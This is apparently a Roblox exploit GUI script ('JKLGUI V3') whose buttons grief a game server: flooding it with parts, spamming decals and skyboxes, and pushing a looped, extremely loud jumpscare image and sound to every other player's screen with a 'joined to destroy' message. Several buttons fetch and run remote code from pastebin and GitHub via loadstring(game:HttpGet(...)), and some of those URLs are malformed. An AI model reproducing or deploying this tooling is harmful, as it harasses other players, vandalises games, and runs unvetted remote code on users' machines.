-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local IMAGE = Instance.new("ImageLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel2 = Instance.new("TextLabel")
local R6AVATAR = Instance.new("TextButton")
local RESETAVATAR = Instance.new("TextButton")
local DISCO = Instance.new("TextButton")
local HINTGAME = Instance.new("TextButton")
local BALLRAINING = Instance.new("TextButton")
local PARTICLES = Instance.new("TextButton")
local NOOTNOOT = Instance.new("TextButton")
local SKYBOX = Instance.new("TextButton")
local JUMPSCARE = Instance.new("TextButton")
local C00ZBDDKIDDGUI = Instance.new("TextButton")
local PHONk = Instance.new("TextButton")
local DAY = Instance.new("TextButton")
local NIGHT = Instance.new("TextButton")
local STOPMUSIC = Instance.new("TextButton")
local FIREALL = Instance.new("TextButton")
local DREAMYBULLXXX = Instance.new("TextButton")
local DECALSPAM1 = Instance.new("TextButton")
local JO1TAR0GUI = Instance.new("TextButton")
local ARABGUI = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game.CoreGui

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(196, 40, 28)
Frame.BorderSizePixel = 3
Frame.Position = UDim2.new(0.536656916, 0, 0.220883533, 0)
Frame.Size = UDim2.new(0, 356, 0, 356)

IMAGE.Parent = Frame
IMAGE.BackgroundColor3 = Color3.fromRGB(174, 167, 255)
IMAGE.BackgroundTransparency = 1
IMAGE.BorderColor3 = Color3.fromRGB(0, 0, 0)
IMAGE.BorderSizePixel = 3
IMAGE.Size = UDim2.new(0, 356, 0, 356)
IMAGE.Image = "rbxassetid://15767625666"

ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
ScrollingFrame.Position = UDim2.new(0.02, 0, 0.08, 0)
ScrollingFrame.Size = UDim2.new(0, 343, 0, 343)

TextLabel_3.Parent = ScrollingFrame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0, 0, 0, 0)
TextLabel_3.Size = UDim2.new(0, 356, 0, 356)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = ""
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextSize = 14.000

TextLabel2.Parent = Frame
TextLabel2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel2.BorderColor3 = Color3.fromRGB(255, 255, 0)
TextLabel2.BorderSizePixel = 3
TextLabel2.Position = UDim2.new(0.15, 0, 0, 0)
TextLabel2.Size = UDim2.new(0, 241, 0, 30)
TextLabel2.Font = Enum.Font.SourceSans
TextLabel2.Text = "JKLGUI V3"
TextLabel2.TextColor3 = Color3.fromRGB(242, 243, 243)
TextLabel2.TextScaled = true
TextLabel2.TextSize = 14.000
TextLabel2.TextWrapped = true

-- BUTTON UP :

R6AVATAR.Parent = Frame
R6AVATAR.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
R6AVATAR.BorderColor3 = Color3.fromRGB(255, 255, 0)
R6AVATAR.BorderSizePixel = 3
R6AVATAR.Position = UDim2.new(0.82, 0, 0, 0)
R6AVATAR.Size = UDim2.new(0, 64, 0, 35)
R6AVATAR.Font = Enum.Font.SourceSans
R6AVATAR.Text = "R6"
R6AVATAR.TextColor3 = Color3.fromRGB(242, 243, 243)
R6AVATAR.TextScaled = true
R6AVATAR.TextSize = 14.000
R6AVATAR.TextWrapped = true
R6AVATAR.MouseButton1Down:connect(function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua'),true))()
end)
RESETAVATAR.Parent = Frame
RESETAVATAR.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
RESETAVATAR.BorderColor3 = Color3.fromRGB(255, 255, 0)
RESETAVATAR.BorderSizePixel = 3
RESETAVATAR.Position = UDim2.new(0, 0, 0, 0)
RESETAVATAR.Size = UDim2.new(0, 64, 0, 35)
RESETAVATAR.Font = Enum.Font.SourceSans
RESETAVATAR.Text = "RE"
RESETAVATAR.TextColor3 = Color3.fromRGB(242, 243, 243)
RESETAVATAR.TextScaled = true
RESETAVATAR.TextSize = 14.000
RESETAVATAR.TextWrapped = true
RESETAVATAR.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.Humanoid.Health = 0
end)

-- PAGE1 :

DISCO.Parent = TextLabel_3
DISCO.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DISCO.BorderColor3 = Color3.fromRGB(255, 255, 0)
DISCO.BorderSizePixel = 3
DISCO.Position = UDim2.new(0.08, 0, 0.15, 0)
DISCO.Size = UDim2.new(0, 92, 0, 30)
DISCO.Font = Enum.Font.SourceSans
DISCO.Text = "DISCO"
DISCO.TextColor3 = Color3.fromRGB(242, 243, 243)
DISCO.TextScaled = true
DISCO.TextSize = 14.000
DISCO.TextWrapped = true
DISCO.MouseButton1Down:connect(function()
local Lighting = game:GetService("Lighting")
		local ColorCorrection = Instance.new("ColorCorrectionEffect", Lighting)
	
		function zigzag(X) 
			return math.acos(math.cos(X*math.pi))/math.pi
		end
	
		Counter = 0
	
		while wait(0.1) do 
			ColorCorrection.TintColor = Color3.fromHSV(zigzag(Counter),1,1)
			Lighting.Ambient = Color3.fromHSV(zigzag(Counter),1,1)
			Counter += 0.01
		end
end)
HINTGAME.Parent = TextLabel_3
HINTGAME.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
HINTGAME.BorderColor3 = Color3.fromRGB(255, 255, 0)
HINTGAME.BorderSizePixel = 3
HINTGAME.Position = UDim2.new(0.38, 0, 0.15, 0)
HINTGAME.Size = UDim2.new(0, 92, 0, 30)
HINTGAME.Font = Enum.Font.SourceSans
HINTGAME.Text = "HINT"
HINTGAME.TextColor3 = Color3.fromRGB(242, 243, 243)
HINTGAME.TextScaled = true
HINTGAME.TextSize = 14.000
HINTGAME.TextWrapped = true
HINTGAME.MouseButton1Down:connect(function()
local m = Instance.new("Hint", game.workspace)
m.Text = "TEAM JKLO JOINED TO DAY!11!2!â£ï¸ð¥"
end)
BALLRAINING.Parent = TextLabel_3
BALLRAINING.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BALLRAINING.BorderColor3 = Color3.fromRGB(255, 255, 0)
BALLRAINING.BorderSizePixel = 3
BALLRAINING.Position = UDim2.new(0.68, 0, 0.15, 0)
BALLRAINING.Size = UDim2.new(0, 92, 0, 30)
BALLRAINING.Font = Enum.Font.SourceSans
BALLRAINING.Text = "BALL RAIN"
BALLRAINING.TextColor3 = Color3.fromRGB(242, 243, 243)
BALLRAINING.TextScaled = true
BALLRAINING.TextSize = 14.000
BALLRAINING.TextWrapped = true
BALLRAINING.MouseButton1Down:connect(function()
while true do
			communism=math.random(0,3)
			crex=math.random(3,100)
			obesity=math.random(-500, 500)
			positivity=math.random(100, 600)
			IEndorseThese=math.random(-500, 500)
			wait()
			doom=Instance.new("Part")
			local imnotfat = math.random(1, 3)
			if imnotfat == 1 then
				doom.Shape = "Ball"
			else if imnotfat == 2 then
					doom.Shape = "Cylinder"
				else 
				end end
			doom.Material = "Neon"
			doom.Size = Vector3.new(crex, crex, crex)
			doom.Position = Vector3.new(obesity, positivity, IEndorseThese)
			doom.Color = Color3.new(math.random(), math.random(), math.random())
			doom.Velocity=Vector3.new(communism, communism, communism)
			doom.Parent = game.Workspace
			yooka=math.random(-200, -50)
			doom=Instance.new("Part")
			doom.Shape = "Ball"
			doom.Size = Vector3.new(crex, crex, crex)
			doom.Position = Vector3.new(obesity, yooka, IEndorseThese)
			doom.Color = Color3.new(math.random(), math.random(), math.random())
			doom.Velocity=Vector3.new(communism, 800, communism)
			doom.Parent = game.Workspace
			communism=math.random(0,3)
			crex=math.random(3,100)
			obesity=math.random(-500, 500)
			positivity=math.random(100, 600)
			IEndorseThese=math.random(-500, 500)
			doom=Instance.new("Part")
			doom.Shape = "Ball"
			doom.Size = Vector3.new(crex, crex, crex)
			doom.Position = Vector3.new(obesity, positivity, IEndorseThese)
			doom.Color = Color3.new(math.random(), math.random(), math.random())
			doom.Velocity=Vector3.new(communism, communism, communism)
			doom.Parent = game.Workspace
			communism=math.random(0,3)
			crex=math.random(3,100)
			obesity=math.random(-500, 500)
			positivity=math.random(100, 600)
			IEndorseThese=math.random(-500, 500)
			doom=Instance.new("Part")
			doom.Shape = "Ball"
			doom.Size = Vector3.new(crex, crex, crex)
			doom.Position = Vector3.new(obesity, positivity, IEndorseThese)
			doom.Color = Color3.new(math.random(), math.random(), math.random())
			doom.Velocity=Vector3.new(communism, communism, communism)
			doom.Parent = game.Workspace
			communism=math.random(0,3)
			crex=math.random(3,100)
			obesity=math.random(-500, 500)
			positivity=math.random(100, 600)
			IEndorseThese=math.random(-500, 500)
			doom=Instance.new("Part")
			doom.Shape = "Ball"
			doom.Size = Vector3.new(crex, crex, crex)
			doom.Position = Vector3.new(obesity, positivity, IEndorseThese)
			doom.Color = Color3.new(math.random(), math.random(), math.random())
			doom.Velocity=Vector3.new(communism, communism, communism)
			doom.Parent = game.Workspace
		end
end)
PARTICLES.Parent = TextLabel_3
PARTICLES.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PARTICLES.BorderColor3 = Color3.fromRGB(196, 40, 28)
PARTICLES.BorderSizePixel = 3
PARTICLES.Position = UDim2.new(0.08, 0, 0.25, 0)
PARTICLES.Size = UDim2.new(0, 92, 0, 30)
PARTICLES.Font = Enum.Font.SourceSans
PARTICLES.Text = "DREAMYBULLXXX PARTICLES"
PARTICLES.TextColor3 = Color3.fromRGB(242, 243, 243)
PARTICLES.TextScaled = true
PARTICLES.TextSize = 14.000
PARTICLES.TextWrapped = true
PARTICLES.MouseButton1Down:connect(function()
local ID = 15681662754 -- Change your ID here fellas cXz (Image ID)
 local particle = true

-- Donât change anything down below if you donât know what are you doing [This script made by cXyzkidd]

if particle == true then
	for i,v in pairs (game.Workspace:GetChildren()) do
		if v:IsA("Part") then
			local particle = Instance.new("ParticleEmitter")
			particle.Texture = "http://www.roblox.com/asset/?id=" ..ID
			particle.Parent = v
			particle.Rate = 200
			for i,x in pairs (game.Workspace:GetChildren()) do
				if x:IsA("Model") then
					for i,z in pairs (x:GetChildren()) do
						if z:IsA("Part") then
							local particle2 = Instance.new("ParticleEmitter")
							particle2.Texture = "http://www.roblox.com/asset/?id=" ..ID
							particle2.Parent = z
							particle2.Rate = 200
						end
					end
				end
			end
		end
	end
end
end)
NOOTNOOT.Parent = TextLabel_3
NOOTNOOT.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
NOOTNOOT.BorderColor3 = Color3.fromRGB(203, 132, 66)
NOOTNOOT.BorderSizePixel = 3
NOOTNOOT.Position = UDim2.new(0.38, 0, 0.25, 0)
NOOTNOOT.Size = UDim2.new(0, 92, 0, 30)
NOOTNOOT.Font = Enum.Font.SourceSans
NOOTNOOT.Text = "NOOTNOOT!"
NOOTNOOT.TextColor3 = Color3.fromRGB(242, 243, 243)
NOOTNOOT.TextScaled = true
NOOTNOOT.TextSize = 14.000
NOOTNOOT.TextWrapped = true
NOOTNOOT.MouseButton1Down:connect(function()
loadstring(game:HttpGet(('https://pastebin.com/raw/EXCYgEzv'),true))()
end)
SKYBOX.Parent = TextLabel_3
SKYBOX.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SKYBOX.BorderColor3 = Color3.fromRGB(196, 40, 28)
SKYBOX.BorderSizePixel = 3
SKYBOX.Position = UDim2.new(0.68, 0, 0.25, 0)
SKYBOX.Size = UDim2.new(0, 92, 0, 30)
SKYBOX.Font = Enum.Font.SourceSans
SKYBOX.Text = "SKYBOX"
SKYBOX.TextColor3 = Color3.fromRGB(242, 243, 243)
SKYBOX.TextScaled = true
SKYBOX.TextSize = 14.000
SKYBOX.TextWrapped = true
SKYBOX.MouseButton1Down:connect(function()
s = Instance.new("Sky")
		s.Name = "SKY"
		s.SkyboxBk = "http://www.roblox.com/Asset/?id=15710230657"
		s.SkyboxDn = "http://www.roblox.com/Asset/?id=15710230657"
		s.SkyboxFt = "http://www.roblox.com/Asset/?id=15710230657"
		s.SkyboxLf = "http://www.roblox.com/Asset/?id=15710230657"
		s.SkyboxRt = "http://www.roblox.com/Asset/?id=15710230657"
                s.SkyboxUp = "http://www.roblox.com/Asset/?id=15710230657"
                s.Parent = game.Lighting
wait()
end)
JUMPSCARE.Parent = TextLabel_3
JUMPSCARE.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
JUMPSCARE.BorderColor3 = Color3.fromRGB(196, 40, 28)
JUMPSCARE.BorderSizePixel = 3
JUMPSCARE.Position = UDim2.new(0.68, 0, 0.35, 0)
JUMPSCARE.Size = UDim2.new(0, 92, 0, 30)
JUMPSCARE.Font = Enum.Font.SourceSans
JUMPSCARE.Text = "JUMPSCARE"
JUMPSCARE.TextColor3 = Color3.fromRGB(242, 243, 243)
JUMPSCARE.TextScaled = true
JUMPSCARE.TextSize = 14.000
JUMPSCARE.TextWrapped = true
JUMPSCARE.MouseButton1Down:connect(function()
for i,v in pairs(game.Players:GetPlayers()) do
		if v.Name ~= me and not v.PlayerGui:FindFirstChild("k00pkidd's Jumpscare") and v:FindFirstChild("PlayerGui") then
			spawn(function()
				local newgui = Instance.new("ScreenGui",v.PlayerGui)
				newgui.Name = "k00p's Jumpscare"
				local newimage = Instance.new("ImageLabel",newgui)
				newimage.Image = "rbxassetid://15767625666"
				newimage.Size = UDim2.new(0,900,0,345)
                               
                                newimage.BackgroundTransparency = 1
                                local m = Instance.new("Hint", game.workspace)
		                m.Text = " TEAM JKLO JOINED TO DESTROY HAHA!11!2!"
       s = Instance.new("Sound",newgui)
				s.SoundId = "rbxassetid://8683380188"
				s.Volume = 9e9
				s.Looped = true
				s:Play()
				print("Screamed "..v.Name)
				while wait(9) do

					newimage.Parent:Destroy()

				end
			end)
		end
	end
end)
C00ZBDDKIDDGUI.Parent = TextLabel_3
C00ZBDDKIDDGUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
C00ZBDDKIDDGUI.BorderColor3 = Color3.fromRGB(196, 40, 28)
C00ZBDDKIDDGUI.BorderSizePixel = 3
C00ZBDDKIDDGUI.Position = UDim2.new(0.38, 0, 0.35, 0)
C00ZBDDKIDDGUI.Size = UDim2.new(0, 92, 0, 30)
C00ZBDDKIDDGUI.Font = Enum.Font.SourceSans
C00ZBDDKIDDGUI.Text = "DELETED"
C00ZBDDKIDDGUI.TextColor3 = Color3.fromRGB(242, 243, 243)
C00ZBDDKIDDGUI.TextScaled = true
C00ZBDDKIDDGUI.TextSize = 14.000
C00ZBDDKIDDGUI.TextWrapped = true
C00ZBDDKIDDGUI.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://pastebin.com/5zudz84m"))()
wait()
setclipboard("KEY IS C00ZBDDKIDD")
end)
PHONk.Parent = TextLabel_3
PHONk.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PHONk.BorderColor3 = Color3.fromRGB(196, 40, 28)
PHONk.BorderSizePixel = 3
PHONk.Position = UDim2.new(0.08, 0, 0.35, 0)
PHONk.Size = UDim2.new(0, 92, 0, 30)
PHONk.Font = Enum.Font.SourceSans
PHONk.Text = "PHONk"
PHONk.TextColor3 = Color3.fromRGB(242, 243, 243)
PHONk.TextScaled = true
PHONk.TextSize = 14.000
PHONk.TextWrapped = true
PHONk.MouseButton1Down:connect(function()
local tubers93		= Instance.new("Sound")
		tubers93.Parent		= game:GetService("Workspace")
		tubers93.SoundId		= "rbxassetid://4822707169 "
		tubers93.Playing		= true
		tubers93.Looped		= true
		tubers93.Volume		= 5e9
end)
DAY.Parent = TextLabel_3
DAY.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DAY.BorderColor3 = Color3.fromRGB(75, 151, 75)
DAY.BorderSizePixel = 3
DAY.Position = UDim2.new(0.08, 0, 0.45, 0)
DAY.Size = UDim2.new(0, 92, 0, 30)
DAY.Font = Enum.Font.SourceSans
DAY.Text = "DAY"
DAY.TextColor3 = Color3.fromRGB(242, 243, 243)
DAY.TextScaled = true
DAY.TextSize = 14.000
DAY.TextWrapped = true
DAY.MouseButton1Down:connect(function()
while true do
		print ("Loop cycle start")
		game.Lighting.TimeOfDay = "12:00:00"
		wait(0.5)
	end
end)
NIGHT.Parent = TextLabel_3
NIGHT.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
NIGHT.BorderColor3 = Color3.fromRGB(196, 40, 28)
NIGHT.BorderSizePixel = 3
NIGHT.Position = UDim2.new(0.38, 0, 0.45, 0)
NIGHT.Size = UDim2.new(0, 92, 0, 30)
NIGHT.Font = Enum.Font.SourceSans
NIGHT.Text = "NIGHT"
NIGHT.TextColor3 = Color3.fromRGB(242, 243, 243)
NIGHT.TextScaled = true
NIGHT.TextSize = 14.000
NIGHT.TextWrapped = true
NIGHT.MouseButton1Down:connect(function()
while true do
		print ("Loop cycle start")
		game.Lighting.TimeOfDay = "18:00:00"
		wait(0.5)
	end
end)
STOPMUSIC.Parent = TextLabel_3
STOPMUSIC.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
STOPMUSIC.BorderColor3 = Color3.fromRGB(75, 151, 75)
STOPMUSIC.BorderSizePixel = 3
STOPMUSIC.Position = UDim2.new(0.68, 0, 0.45, 0)
STOPMUSIC.Size = UDim2.new(0, 92, 0, 30)
STOPMUSIC.Font = Enum.Font.SourceSans
STOPMUSIC.Text = "STOP MUSIC"
STOPMUSIC.TextColor3 = Color3.fromRGB(242, 243, 243)
STOPMUSIC.TextScaled = true
STOPMUSIC.TextSize = 14.000
STOPMUSIC.TextWrapped = true
STOPMUSIC.MouseButton1Down:connect(function()
for i,v in pairs(workspace:GetDescendants()) do
        if v:IsA("Sound") then
            v.Playing = false
        end
    end
end)
FIREALL.Parent = TextLabel_3
FIREALL.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FIREALL.BorderColor3 = Color3.fromRGB(75, 151, 75)
FIREALL.BorderSizePixel = 3
FIREALL.Position = UDim2.new(0.38, 0, 0.55, 0)
FIREALL.Size = UDim2.new(0, 92, 0, 30)
FIREALL.Font = Enum.Font.SourceSans
FIREALL.Text = "FIRE MYSELF"
FIREALL.TextColor3 = Color3.fromRGB(242, 243, 243)
FIREALL.TextScaled = true
FIREALL.TextSize = 14.000
FIREALL.TextWrapped = true
FIREALL.MouseButton1Down:connect(function()
local player = game:GetService("Players").LocalPlayer
local Fire = Instance.new("Fire", player.Character.Torso)
Fire.Size = 20
Fire.Color = Color3.new(1,1,90)
Fire.SecondaryColor = Color3.new(1,1,90)
end)
DREAMYBULLXXX.Parent = TextLabel_3
DREAMYBULLXXX.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DREAMYBULLXXX.BorderColor3 = Color3.fromRGB(196, 40, 28)
DREAMYBULLXXX.BorderSizePixel = 3
DREAMYBULLXXX.Position = UDim2.new(0.08, 0, 0.55, 0)
DREAMYBULLXXX.Size = UDim2.new(0, 92, 0, 30)
DREAMYBULLXXX.Font = Enum.Font.SourceSans
DREAMYBULLXXX.Text = "DREAMYBULLXXX NEXTBOT"
DREAMYBULLXXX.TextColor3 = Color3.fromRGB(242, 243, 243)
DREAMYBULLXXX.TextScaled = true
DREAMYBULLXXX.TextSize = 14.000
DREAMYBULLXXX.TextWrapped = true
DREAMYBULLXXX.MouseButton1Down:connect(function()
local player = game:GetService("Players").LocalPlayer
gui1 = Instance.new("BillboardGui", player.Character.Head)
gui1.Size = UDim2.new(10,0,10,0)
gui1.StudsOffset = Vector3.new(0,0,0)
gui1.AlwaysOnTop = true
text1 = Instance.new("ImageLabel")
text1.Image = "http://www.roblox.com/asset/?id=15681662754"
text1.Size = UDim2.new(1,0,1,0)
text1.Position = UDim2.new(0,0,0.2,0)
text1.BackgroundTransparency = 1
text1.Parent = gui1
wait()
end)
DECALSPAM1.Parent = TextLabel_3
DECALSPAM1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DECALSPAM1.BorderColor3 = Color3.fromRGB(196, 40, 28)
DECALSPAM1.BorderSizePixel = 3
DECALSPAM1.Position = UDim2.new(0.68, 0, 0.55, 0)
DECALSPAM1.Size = UDim2.new(0, 92, 0, 30)
DECALSPAM1.Font = Enum.Font.SourceSans
DECALSPAM1.Text = "DECAL1"
DECALSPAM1.TextColor3 = Color3.fromRGB(242, 243, 243)
DECALSPAM1.TextScaled = true
DECALSPAM1.TextSize = 14.000
DECALSPAM1.TextWrapped = true
DECALSPAM1.MouseButton1Down:connect(function()
s = Instance.new("Sky")
s.Name = "Skybox"
s.SkyboxBk = "http://www.roblox.com/asset/?id=15778692364"
s.SkyboxDn = "http://www.roblox.com/asset/?id=15778692364"
s.SkyboxFt = "http://www.roblox.com/asset/?id=15778692364"
s.SkyboxLf = "http://www.roblox.com/asset/?id=15778692364"
s.SkyboxRt = "http://www.roblox.com/asset/?id=15778692364"
s.SkyboxUp = "http://www.roblox.com/asset/?id=15778692364"
        s.Parent = game.Lighting
		local ID = 15769947250
		function spamDecal(v)
			if v:IsA("Part") then
				for i = 0, 5 do
					D = Instance.new("Decal")
					D.Name = "k00pz"
					D.Face = i
					D.Parent = v
					D.Texture = ("http://www.roblox.com/asset/?id="..Id)
				end
			else
				if v:IsA("Model") then
					for a,b in pairs(v:GetChildren()) do
						spamDecal(b)
					end
				end
			end
		end
		function decalspam(id)
			Id = id
			for i,v in pairs(game.Workspace:GetChildren()) do
				if v:IsA("Part") then
					for i = 0, 5 do
						D = Instance.new("Decal")
						D.Name = "k00pz"
						D.Face = i
						D.Parent = v
						D.Texture = ("http://www.roblox.com/asset/?id="..id)
					end
				else
					if v:IsA("Model") then
						for a,b in pairs(v:GetChildren()) do
							spamDecal(b)
						end
					end
				end
			end
		end	
decalspam(ID)
end)
JO1TAR0GUI.Parent = TextLabel_3
JO1TAR0GUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
JO1TAR0GUI.BorderColor3 = Color3.fromRGB(0, 0, 0)
JO1TAR0GUI.BorderSizePixel = 3
JO1TAR0GUI.Position = UDim2.new(0.08, 0, 0.65, 0)
JO1TAR0GUI.Size = UDim2.new(0, 92, 0, 30)
JO1TAR0GUI.Font = Enum.Font.SourceSans
JO1TAR0GUI.Text = "DELETED"
JO1TAR0GUI.TextColor3 = Color3.fromRGB(242, 243, 243)
JO1TAR0GUI.TextScaled = true
JO1TAR0GUI.TextSize = 14.000
JO1TAR0GUI.TextWrapped = true
JO1TAR0GUI.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontentcom/BOSSJKLO/JAT/main/JOHTAR0G08"))()
end)
ARABGUI.Parent = TextLabel_3
ARABGUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ARABGUI.BorderColor3 = Color3.fromRGB(0, 0, 0)
ARABGUI.BorderSizePixel = 3
ARABGUI.Position = UDim2.new(0.38, 0, 0.65, 0)
ARABGUI.Size = UDim2.new(0, 92, 0, 30)
ARABGUI.Font = Enum.Font.SourceSans
ARABGUI.Text = "DELETD"
ARABGUI.TextColor3 = Color3.fromRGB(242, 243, 243)
ARABGUI.TextScaled = true
ARABGUI.TextSize = 14.000
ARABGUI.TextWrapped = true
ARABGUI.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontentom/BOSSJKL3/Arab-gui/main/Arbui"))()
end)

-- Scripts :

local function QFCS_fake_script() -- Frame.Dragify 
	local script = Instance.new('LocalScript', Frame)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(QFCS_fake_script)()